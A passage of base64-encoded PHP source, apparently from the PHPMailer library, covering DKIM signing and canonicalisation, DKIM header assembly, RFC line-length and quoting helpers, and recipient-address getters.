ZXRfY29udGVudHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSk7CiAgICAgICAgaWYgKCcnICE9PSAkdGhpcy0+REtJTV9wYXNzcGhyYXNlKSB7CiAgICAgICAgICAgICRwcml2S2V5ID0gb3BlbnNzbF9wa2V5X2dldF9wcml2YXRlKCRwcml2S2V5U3RyLCAkdGhpcy0+REtJTV9wYXNzcGhyYXNlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0cik7CiAgICAgICAgfQogICAgICAgIGlmIChvcGVuc3NsX3NpZ24oJHNpZ25IZWFkZXIsICRzaWduYXR1cmUsICRwcml2S2V5LCAnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nKSkgewogICAgICAgICAgICBpZiAoXFBIUF9NQUpPUl9WRVJTSU9OIDwgOCkgewogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkc2lnbmF0dXJlKTsKICAgICAgICB9CiAgICAgICAgaWYgKFxQSFBfTUFKT1JfVkVSU0lPTiA8IDgpIHsKICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICcnOwogICAgfQoKICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIGNhbm9uaWNhbGl6YXRpb24gaGVhZGVyLgogICAgICogVXNlcyB0aGUgJ3JlbGF4ZWQnIGFsZ29yaXRobSBmcm9tIFJGQzYzNzYgc2VjdGlvbiAzLjQuMi4KICAgICAqIENhbm9uaWNhbGl6ZWQgaGVhZGVycyBzaG91bGQgKmFsd2F5cyogdXNlIENSTEYsIHJlZ2FyZGxlc3Mgb2YgbWFpbGVyIHNldHRpbmcuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL3d3dy5yZmMtZWRpdG9yLm9yZy9yZmMvcmZjNjM3NiNzZWN0aW9uLTMuNC4yCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc2lnbkhlYWRlciBIZWFkZXIKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9IZWFkZXJDKCRzaWduSGVhZGVyKQogICAgewogICAgICAgIC8vTm9ybWFsaXplIGJyZWFrcyB0byBDUkxGIChyZWdhcmRsZXNzIG9mIHRoZSBtYWlsZXIpCiAgICAgICAgJHNpZ25IZWFkZXIgPSBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkc2lnbkhlYWRlciwgc2VsZjo6Q1JMRik7CiAgICAgICAgLy9VbmZvbGQgaGVhZGVyIGxpbmVzCiAgICAgICAgLy9Ob3RlIFBDUkUgXHMgaXMgdG9vIGJyb2FkIGEgZGVmaW5pdGlvbiBvZiB3aGl0ZXNwYWNlOyBSRkM1MzIyIGRlZmluZXMgaXQgYXMgYFsgXHRdYAogICAgICAgIC8vQHNlZSBodHRwczovL3d3dy5yZmMtZWRpdG9yLm9yZy9yZmMvcmZjNTMyMiNzZWN0aW9uLTIuMgogICAgICAgIC8vVGhhdCBtZWFucyB0aGlzIG1heSBicmVhayBpZiB5b3UgZG8gc29tZXRoaW5nIGRhZnQgbGlrZSBwdXQgdmVydGljYWwgdGFicyBpbiB5b3VyIGhlYWRlcnMuCiAgICAgICAgJHNpZ25IZWFkZXIgPSBwcmVnX3JlcGxhY2UoJy9cclxuWyBcdF0rLycsICcgJywgJHNpZ25IZWFkZXIpOwogICAgICAgIC8vQnJlYWsgaGVhZGVycyBvdXQgaW50byBhbiBhcnJheQogICAgICAgICRsaW5lcyA9IGV4cGxvZGUoc2VsZjo6Q1JMRiwgJHNpZ25IZWFkZXIpOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAka2V5ID0+ICRsaW5lKSB7CiAgICAgICAgICAgIC8vSWYgdGhlIGhlYWRlciBpcyBtaXNzaW5nIGEgOiwgc2tpcCBpdCBhcyBpdCdzIGludmFsaWQKICAgICAgICAgICAgLy9UaGlzIGlzIGxpa2VseSB0byBoYXBwZW4gYmVjYXVzZSB0aGUgZXhwbG9kZSgpIGFib3ZlIHdpbGwgYWxzbyBzcGxpdAogICAgICAgICAgICAvL29uIHRoZSB0cmFpbGluZyBMRSwgbGVhdmluZyBhbiBlbXB0eSBsaW5lCiAgICAgICAgICAgIGlmIChzdHJwb3MoJGxpbmUsICc6JykgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBsaXN0KCRoZWFkaW5nLCAkdmFsdWUpID0gZXhwbG9kZSgnOicsICRsaW5lLCAyKTsKICAgICAgICAgICAgLy9Mb3dlci1jYXNlIGhlYWRlciBuYW1lCiAgICAgICAgICAgICRoZWFkaW5nID0gc3RydG9sb3dlcigkaGVhZGluZyk7CiAgICAgICAgICAgIC8vQ29sbGFwc2Ugd2hpdGUgc3BhY2Ugd2l0aGluIHRoZSB2YWx1ZSwgYWxzbyBjb252ZXJ0IFdTUCB0byBzcGFjZQogICAgICAgICAgICAkdmFsdWUgPSBwcmVnX3JlcGxhY2UoJy9bIFx0XSsvJywgJyAnLCAkdmFsdWUpOwogICAgICAgICAgICAvL1JGQzYzNzYgaXMgc2xpZ2h0bHkgdW5jbGVhciBoZXJlIC0gaXQgc2F5cyB0byBkZWxldGUgc3BhY2UgYXQgdGhlICplbmQqIG9mIGVhY2ggdmFsdWUKICAgICAgICAgICAgLy9CdXQgdGhlbiBzYXlzIHRvIGRlbGV0ZSBzcGFjZSBiZWZvcmUgYW5kIGFmdGVyIHRoZSBjb2xvbi4KICAgICAgICAgICAgLy9OZXQgcmVzdWx0IGlzIHRoZSBzYW1lIGFzIHRyaW1taW5nIGJvdGggZW5kcyBvZiB0aGUgdmFsdWUuCiAgICAgICAgICAgIC8vQnkgZWxpbWluYXRpb24sIHRoZSBzYW1lIGFwcGxpZXMgdG8gdGhlIGZpZWxkIG5hbWUKICAgICAgICAgICAgJGxpbmVzWyRrZXldID0gdHJpbSgkaGVhZGluZywgIiBcdCIpIC4gJzonIC4gdHJpbSgkdmFsdWUsICIgXHQiKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiBpbXBsb2RlKHNlbGY6OkNSTEYsICRsaW5lcyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZW5lcmF0ZSBhIERLSU0gY2Fub25pY2FsaXphdGlvbiBib2R5LgogICAgICogVXNlcyB0aGUgJ3NpbXBsZScgYWxnb3JpdGhtIGZyb20gUkZDNjM3NiBzZWN0aW9uIDMuNC4zLgogICAgICogQ2Fub25pY2FsaXplZCBib2RpZXMgc2hvdWxkICphbHdheXMqIHVzZSBDUkxGLCByZWdhcmRsZXNzIG9mIG1haWxlciBzZXR0aW5nLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzYzNzYjc2VjdGlvbi0zLjQuMwogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgTWVzc2FnZSBCb2R5CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQm9keUMoJGJvZHkpCiAgICB7CiAgICAgICAgaWYgKGVtcHR5KCRib2R5KSkgewogICAgICAgICAgICByZXR1cm4gc2VsZjo6Q1JMRjsKICAgICAgICB9CiAgICAgICAgLy9Ob3JtYWxpemUgbGluZSBlbmRpbmdzIHRvIENSTEYKICAgICAgICAkYm9keSA9IHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCRib2R5LCBzZWxmOjpDUkxGKTsKCiAgICAgICAgLy9SZWR1Y2UgbXVsdGlwbGUgdHJhaWxpbmcgbGluZSBicmVha3MgdG8gYSBzaW5nbGUgb25lCiAgICAgICAgcmV0dXJuIHN0YXRpYzo6c3RyaXBUcmFpbGluZ0JyZWFrcygkYm9keSkgLiBzZWxmOjpDUkxGOwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIHRoZSBES0lNIGhlYWRlciBhbmQgYm9keSBpbiBhIG5ldyBtZXNzYWdlIGhlYWRlci4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXJzX2xpbmUgSGVhZGVyIGxpbmVzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdWJqZWN0ICAgICAgU3ViamVjdAogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSAgICAgICAgIEJvZHkKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0FkZCgkaGVhZGVyc19saW5lLCAkc3ViamVjdCwgJGJvZHkpCiAgICB7CiAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlID0gJ3JzYS1zaGEyNTYnOyAvL1NpZ25hdHVyZSAmIGhhc2ggYWxnb3JpdGhtcwogICAgICAgICRES0lNY2Fub25pY2FsaXphdGlvbiA9ICdyZWxheGVkL3NpbXBsZSc7IC8vQ2Fub25pY2FsaXphdGlvbiBtZXRob2RzIG9mIGhlYWRlciAmIGJvZHkKICAgICAgICAkREtJTXF1ZXJ5ID0gJ2Rucy90eHQnOyAvL1F1ZXJ5IG1ldGhvZAogICAgICAgICRES0lNdGltZSA9IHRpbWUoKTsKICAgICAgICAvL0Fsd2F5cyBzaWduIHRoZXNlIGhlYWRlcnMgd2l0aG91dCBiZWluZyBhc2tlZAogICAgICAgIC8vUmVjb21tZW5kZWQgbGlzdCBmcm9tIGh0dHBzOi8vd3d3LnJmYy1lZGl0b3Iub3JnL3JmYy9yZmM2Mzc2I3NlY3Rpb24tNS40LjEKICAgICAgICAkYXV0b1NpZ25IZWFkZXJzID0gWwogICAgICAgICAgICAnZnJvbScsCiAgICAgICAgICAgICd0bycsCiAgICAgICAgICAgICdjYycsCiAgICAgICAgICAgICdkYXRlJywKICAgICAgICAgICAgJ3N1YmplY3QnLAogICAgICAgICAgICAncmVwbHktdG8nLAogICAgICAgICAgICAnbWVzc2FnZS1pZCcsCiAgICAgICAgICAgICdjb250ZW50LXR5cGUnLAogICAgICAgICAgICAnbWltZS12ZXJzaW9uJywKICAgICAgICAgICAgJ3gtbWFpbGVyJywKICAgICAgICBdOwogICAgICAgIGlmIChzdHJpcG9zKCRoZWFkZXJzX2xpbmUsICdTdWJqZWN0JykgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICRoZWFkZXJzX2xpbmUgLj0gJ1N1YmplY3Q6ICcgLiAkc3ViamVjdCAuIHN0YXRpYzo6JExFOwogICAgICAgIH0KICAgICAgICAkaGVhZGVyTGluZXMgPSBleHBsb2RlKHN0YXRpYzo6JExFLCAkaGVhZGVyc19saW5lKTsKICAgICAgICAkY3VycmVudEhlYWRlckxhYmVsID0gJyc7CiAgICAgICAgJGN1cnJlbnRIZWFkZXJWYWx1ZSA9ICcnOwogICAgICAgICRwYXJzZWRIZWFkZXJzID0gW107CiAgICAgICAgJGhlYWRlckxpbmVJbmRleCA9IDA7CiAgICAgICAgJGhlYWRlckxpbmVDb3VudCA9IGNvdW50KCRoZWFkZXJMaW5lcyk7CiAgICAgICAgZm9yZWFjaCAoJGhlYWRlckxpbmVzIGFzICRoZWFkZXJMaW5lKSB7CiAgICAgICAgICAgICRtYXRjaGVzID0gW107CiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvXihbXiBcdF0qPykoPzo6WyBcdF0qKSguKikkLycsICRoZWFkZXJMaW5lLCAkbWF0Y2hlcykpIHsKICAgICAgICAgICAgICAgIGlmICgkY3VycmVudEhlYWRlckxhYmVsICE9PSAnJykgewogICAgICAgICAgICAgICAgICAgIC8vV2Ugd2VyZSBwcmV2aW91c2x5IGluIGFub3RoZXIgaGVhZGVyOyBUaGlzIGlzIHRoZSBzdGFydCBvZiBhIG5ldyBoZWFkZXIsIHNvIHNhdmUgdGhlIHByZXZpb3VzIG9uZQogICAgICAgICAgICAgICAgICAgICRwYXJzZWRIZWFkZXJzW10gPSBbJ2xhYmVsJyA9PiAkY3VycmVudEhlYWRlckxhYmVsLCAndmFsdWUnID0+ICRjdXJyZW50SGVhZGVyVmFsdWVdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGN1cnJlbnRIZWFkZXJMYWJlbCA9ICRtYXRjaGVzWzFdOwogICAgICAgICAgICAgICAgJGN1cnJlbnRIZWFkZXJWYWx1ZSA9ICRtYXRjaGVzWzJdOwogICAgICAgICAgICB9IGVsc2VpZiAocHJlZ19tYXRjaCgnL15bIFx0XSsoLiopJC8nLCAkaGVhZGVyTGluZSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICAgICAvL1RoaXMgaXMgYSBmb2xkZWQgY29udGludWF0aW9uIG9mIHRoZSBjdXJyZW50IGhlYWRlciwgc28gdW5mb2xkIGl0CiAgICAgICAgICAgICAgICAkY3VycmVudEhlYWRlclZhbHVlIC49ICcgJyAuICRtYXRjaGVzWzFdOwogICAgICAgICAgICB9CiAgICAgICAgICAgICsrJGhlYWRlckxpbmVJbmRleDsKICAgICAgICAgICAgaWYgKCRoZWFkZXJMaW5lSW5kZXggPj0gJGhlYWRlckxpbmVDb3VudCkgewogICAgICAgICAgICAgICAgLy9UaGlzIHdhcyB0aGUgbGFzdCBsaW5lLCBzbyBmaW5pc2ggb2ZmIHRoaXMgaGVhZGVyCiAgICAgICAgICAgICAgICAkcGFyc2VkSGVhZGVyc1tdID0gWydsYWJlbCcgPT4gJGN1cnJlbnRIZWFkZXJMYWJlbCwgJ3ZhbHVlJyA9PiAkY3VycmVudEhlYWRlclZhbHVlXTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkY29waWVkSGVhZGVycyA9IFtdOwogICAgICAgICRoZWFkZXJzVG9TaWduS2V5cyA9IFtdOwogICAgICAgICRoZWFkZXJzVG9TaWduID0gW107CiAgICAgICAgZm9yZWFjaCAoJHBhcnNlZEhlYWRlcnMgYXMgJGhlYWRlcikgewogICAgICAgICAgICAvL0lzIHRoaXMgaGVhZGVyIG9uZSB0aGF0IG11c3QgYmUgaW5jbHVkZWQgaW4gdGhlIERLSU0gc2lnbmF0dXJlPwogICAgICAgICAgICBpZiAoaW5fYXJyYXkoc3RydG9sb3dlcigkaGVhZGVyWydsYWJlbCddKSwgJGF1dG9TaWduSGVhZGVycywgdHJ1ZSkpIHsKICAgICAgICAgICAgICAgICRoZWFkZXJzVG9TaWduS2V5c1tdID0gJGhlYWRlclsnbGFiZWwnXTsKICAgICAgICAgICAgICAgICRoZWFkZXJzVG9TaWduW10gPSAkaGVhZGVyWydsYWJlbCddIC4gJzogJyAuICRoZWFkZXJbJ3ZhbHVlJ107CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkRLSU1fY29weUhlYWRlckZpZWxkcykgewogICAgICAgICAgICAgICAgICAgICRjb3BpZWRIZWFkZXJzW10gPSAkaGVhZGVyWydsYWJlbCddIC4gJzonIC4gLy9Ob3RlIG5vIHNwYWNlIGFmdGVyIHRoaXMsIGFzIHBlciBSRkMKICAgICAgICAgICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGhlYWRlclsndmFsdWUnXSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy9JcyB0aGlzIGFuIGV4dHJhIGN1c3RvbSBoZWFkZXIgd2UndmUgYmVlbiBhc2tlZCB0byBzaWduPwogICAgICAgICAgICBpZiAoaW5fYXJyYXkoJGhlYWRlclsnbGFiZWwnXSwgJHRoaXMtPkRLSU1fZXh0cmFIZWFkZXJzLCB0cnVlKSkgewogICAgICAgICAgICAgICAgLy9GaW5kIGl0cyB2YWx1ZSBpbiBjdXN0b20gaGVhZGVycwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPkN1c3RvbUhlYWRlciBhcyAkY3VzdG9tSGVhZGVyKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRjdXN0b21IZWFkZXJbMF0gPT09ICRoZWFkZXJbJ2xhYmVsJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhlYWRlcnNUb1NpZ25LZXlzW10gPSAkaGVhZGVyWydsYWJlbCddOwogICAgICAgICAgICAgICAgICAgICAgICAkaGVhZGVyc1RvU2lnbltdID0gJGhlYWRlclsnbGFiZWwnXSAuICc6ICcgLiAkaGVhZGVyWyd2YWx1ZSddOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkRLSU1fY29weUhlYWRlckZpZWxkcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvcGllZEhlYWRlcnNbXSA9ICRoZWFkZXJbJ2xhYmVsJ10gLiAnOicgLiAvL05vdGUgbm8gc3BhY2UgYWZ0ZXIgdGhpcywgYXMgcGVyIFJGQwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRoZWFkZXJbJ3ZhbHVlJ10pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAvL1NraXAgc3RyYWlnaHQgdG8gdGhlIG5leHQgaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlIDI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRjb3BpZWRIZWFkZXJGaWVsZHMgPSAnJzsKICAgICAgICBpZiAoJHRoaXMtPkRLSU1fY29weUhlYWRlckZpZWxkcyAmJiBjb3VudCgkY29waWVkSGVhZGVycykgPiAwKSB7CiAgICAgICAgICAgIC8vQXNzZW1ibGUgYSBES0lNICd6JyB0YWcKICAgICAgICAgICAgJGNvcGllZEhlYWRlckZpZWxkcyA9ICcgej0nOwogICAgICAgICAgICAkZmlyc3QgPSB0cnVlOwogICAgICAgICAgICBmb3JlYWNoICgkY29waWVkSGVhZGVycyBhcyAkY29waWVkSGVhZGVyKSB7CiAgICAgICAgICAgICAgICBpZiAoISRmaXJzdCkgewogICAgICAgICAgICAgICAgICAgICRjb3BpZWRIZWFkZXJGaWVsZHMgLj0gc3RhdGljOjokTEUgLiAnIHwnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy9Gb2xkIGxvbmcgdmFsdWVzCiAgICAgICAgICAgICAgICBpZiAoc3RybGVuKCRjb3BpZWRIZWFkZXIpID4gc2VsZjo6U1REX0xJTkVfTEVOR1RIIC0gMykgewogICAgICAgICAgICAgICAgICAgICRjb3BpZWRIZWFkZXJGaWVsZHMgLj0gc3Vic3RyKAogICAgICAgICAgICAgICAgICAgICAgICBjaHVua19zcGxpdCgkY29waWVkSGVhZGVyLCBzZWxmOjpTVERfTElORV9MRU5HVEggLSAzLCBzdGF0aWM6OiRMRSAuIHNlbGY6OkZXUyksCiAgICAgICAgICAgICAgICAgICAgICAgIDAsCiAgICAgICAgICAgICAgICAgICAgICAgIC1zdHJsZW4oc3RhdGljOjokTEUgLiBzZWxmOjpGV1MpCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGNvcGllZEhlYWRlckZpZWxkcyAuPSAkY29waWVkSGVhZGVyOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGZpcnN0ID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGNvcGllZEhlYWRlckZpZWxkcyAuPSAnOycgLiBzdGF0aWM6OiRMRTsKICAgICAgICB9CiAgICAgICAgJGhlYWRlcktleXMgPSAnIGg9JyAuIGltcGxvZGUoJzonLCAkaGVhZGVyc1RvU2lnbktleXMpIC4gJzsnIC4gc3RhdGljOjokTEU7CiAgICAgICAgJGhlYWRlclZhbHVlcyA9IGltcGxvZGUoc3RhdGljOjokTEUsICRoZWFkZXJzVG9TaWduKTsKICAgICAgICAkYm9keSA9ICR0aGlzLT5ES0lNX0JvZHlDKCRib2R5KTsKICAgICAgICAvL0Jhc2U2NCBvZiBwYWNrZWQgYmluYXJ5IFNIQS0yNTYgaGFzaCBvZiBib2R5CiAgICAgICAgJERLSU1iNjQgPSBiYXNlNjRfZW5jb2RlKHBhY2soJ0gqJywgaGFzaCgnc2hhMjU2JywgJGJvZHkpKSk7CiAgICAgICAgJGlkZW50ID0gJyc7CiAgICAgICAgaWYgKCcnICE9PSAkdGhpcy0+REtJTV9pZGVudGl0eSkgewogICAgICAgICAgICAkaWRlbnQgPSAnIGk9JyAuICR0aGlzLT5ES0lNX2lkZW50aXR5IC4gJzsnIC4gc3RhdGljOjokTEU7CiAgICAgICAgfQogICAgICAgIC8vVGhlIERLSU0tU2lnbmF0dXJlIGhlYWRlciBpcyBpbmNsdWRlZCBpbiB0aGUgc2lnbmF0dXJlICpleGNlcHQgZm9yKiB0aGUgdmFsdWUgb2YgdGhlIGBiYCB0YWcKICAgICAgICAvL3doaWNoIGlzIGFwcGVuZGVkIGFmdGVyIGNhbGN1bGF0aW5nIHRoZSBzaWduYXR1cmUKICAgICAgICAvL2h0dHBzOi8vd3d3LnJmYy1lZGl0b3Iub3JnL3JmYy9yZmM2Mzc2I3NlY3Rpb24tMy41CiAgICAgICAgJGRraW1TaWduYXR1cmVIZWFkZXIgPSAnREtJTS1TaWduYXR1cmU6IHY9MTsnIC4KICAgICAgICAgICAgJyBkPScgLiAkdGhpcy0+REtJTV9kb21haW4gLiAnOycgLgogICAgICAgICAgICAnIHM9JyAuICR0aGlzLT5ES0lNX3NlbGVjdG9yIC4gJzsnIC4gc3RhdGljOjokTEUgLgogICAgICAgICAgICAnIGE9JyAuICRES0lNc2lnbmF0dXJlVHlwZSAuICc7JyAuCiAgICAgICAgICAgICcgcT0nIC4gJERLSU1xdWVyeSAuICc7JyAuCiAgICAgICAgICAgICcgdD0nIC4gJERLSU10aW1lIC4gJzsnIC4KICAgICAgICAgICAgJyBjPScgLiAkREtJTWNhbm9uaWNhbGl6YXRpb24gLiAnOycgLiBzdGF0aWM6OiRMRSAuCiAgICAgICAgICAgICRoZWFkZXJLZXlzIC4KICAgICAgICAgICAgJGlkZW50IC4KICAgICAgICAgICAgJGNvcGllZEhlYWRlckZpZWxkcyAuCiAgICAgICAgICAgICcgYmg9JyAuICRES0lNYjY0IC4gJzsnIC4gc3RhdGljOjokTEUgLgogICAgICAgICAgICAnIGI9JzsKICAgICAgICAvL0Nhbm9uaWNhbGl6ZSB0aGUgc2V0IG9mIGhlYWRlcnMKICAgICAgICAkY2Fub25pY2FsaXplZEhlYWRlcnMgPSAkdGhpcy0+REtJTV9IZWFkZXJDKAogICAgICAgICAgICAkaGVhZGVyVmFsdWVzIC4gc3RhdGljOjokTEUgLiAkZGtpbVNpZ25hdHVyZUhlYWRlcgogICAgICAgICk7CiAgICAgICAgJHNpZ25hdHVyZSA9ICR0aGlzLT5ES0lNX1NpZ24oJGNhbm9uaWNhbGl6ZWRIZWFkZXJzKTsKICAgICAgICAkc2lnbmF0dXJlID0gdHJpbShjaHVua19zcGxpdCgkc2lnbmF0dXJlLCBzZWxmOjpTVERfTElORV9MRU5HVEggLSAzLCBzdGF0aWM6OiRMRSAuIHNlbGY6OkZXUykpOwoKICAgICAgICByZXR1cm4gc3RhdGljOjpub3JtYWxpemVCcmVha3MoJGRraW1TaWduYXR1cmVIZWFkZXIgLiAkc2lnbmF0dXJlKTsKICAgIH0KCiAgICAvKioKICAgICAqIERldGVjdCBpZiBhIHN0cmluZyBjb250YWlucyBhIGxpbmUgbG9uZ2VyIHRoYW4gdGhlIG1heGltdW0gbGluZSBsZW5ndGgKICAgICAqIGFsbG93ZWQgYnkgUkZDIDI4MjIgc2VjdGlvbiAyLjEuMS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBoYXNMaW5lTG9uZ2VyVGhhbk1heCgkc3RyKQogICAgewogICAgICAgIHJldHVybiAoYm9vbCkgcHJlZ19tYXRjaCgnL14oLnsnIC4gKHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCArIHN0cmxlbihzdGF0aWM6OiRMRSkpIC4gJyx9KS9tJywgJHN0cik7CiAgICB9CgogICAgLyoqCiAgICAgKiBJZiBhIHN0cmluZyBjb250YWlucyBhbnkgInNwZWNpYWwiIGNoYXJhY3RlcnMsIGRvdWJsZS1xdW90ZSB0aGUgbmFtZSwKICAgICAqIGFuZCBlc2NhcGUgYW55IGRvdWJsZSBxdW90ZXMgd2l0aCBhIGJhY2tzbGFzaC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICoKICAgICAqIEBzZWUgUkZDODIyIDMuNC4xCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcXVvdGVkU3RyaW5nKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKHByZWdfbWF0Y2goJy9bICgpPD5ALDs6IlwvXFtcXT89XS8nLCAkc3RyKSkgewogICAgICAgICAgICAvL0lmIHRoZSBzdHJpbmcgY29udGFpbnMgYW55IG9mIHRoZXNlIGNoYXJzLCBpdCBtdXN0IGJlIGRvdWJsZS1xdW90ZWQKICAgICAgICAgICAgLy9hbmQgYW55IGRvdWJsZSBxdW90ZXMgbXVzdCBiZSBlc2NhcGVkIHdpdGggYSBiYWNrc2xhc2gKICAgICAgICAgICAgcmV0dXJuICciJyAuIHN0cl9yZXBsYWNlKCciJywgJ1xcIicsICRzdHIpIC4gJyInOwogICAgICAgIH0KCiAgICAgICAgLy9SZXR1cm4gdGhlIHN0cmluZyB1bnRvdWNoZWQsIGl0IGRvZXNuJ3QgbmVlZCBxdW90aW5nCiAgICAgICAgcmV0dXJuICRzdHI7CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAndG8nIHByb3BlcnR5LgogICAgICogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VG9BZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+dG87CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnY2MnIHByb3BlcnR5LgogICAgICogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q2NBZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+Y2M7CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnYmNjJyBwcm9wZXJ0eS4KICAgICAqIEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICoKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEJjY0FkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5iY2M7CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnUmVwbHlUbycgcHJvcGVydHkuCiAgICAgKiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRSZXBseVRvQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPlJlcGx5VG87CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnYWxsX3JlY2lwaWVudHMnIHByb3BlcnR5LgogICAgICogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QWxsUmVjaXBpZW50QWRkcmVzc2VzKCkKICAgIHsKICAgICAgICBy